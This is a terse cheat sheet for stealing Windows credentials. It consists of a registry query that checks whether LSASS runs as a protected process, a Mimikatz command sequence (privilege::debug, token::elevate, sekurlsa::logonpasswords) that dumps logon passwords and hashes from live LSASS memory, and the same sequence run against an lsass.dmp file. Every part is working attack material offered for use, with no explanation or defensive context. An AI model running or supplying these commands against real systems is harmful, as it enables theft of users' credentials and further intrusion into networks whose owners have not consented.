Check LSASS Protection
```powershell
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

Mimikatz
```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

Mimikatz from lsass.dmp
```
privilege::debug
token::elevate
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```


